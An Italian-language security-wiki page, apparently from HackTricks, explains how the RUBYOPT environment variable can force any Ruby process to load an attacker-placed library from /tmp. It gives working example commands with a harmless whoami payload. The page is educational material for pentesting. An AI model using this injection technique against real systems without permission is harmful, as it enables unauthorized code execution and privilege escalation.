# Iniezione nelle applicazioni Ruby

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Utilizzando questa variabile d'ambiente è possibile **aggiungere nuovi parametri** a **ruby** ogni volta che viene eseguito. Sebbene il parametro **`-e`** non possa essere utilizzato per specificare codice ruby da eseguire, è possibile usare i parametri **`-I`** e **`-r`** per aggiungere una nuova cartella al percorso di caricamento delle librerie e quindi **specificare una libreria da caricare**.

Crea la libreria **`inject.rb`** in **`/tmp`**:
```ruby:inject.rb
puts `whoami`
```
Crea ovunque uno script Ruby come:
```ruby:hello.rb
puts 'Hello, World!'
```
Quindi fai in modo che uno script Ruby arbitrario lo carichi con:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Curiosità: funziona anche con il parametro **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
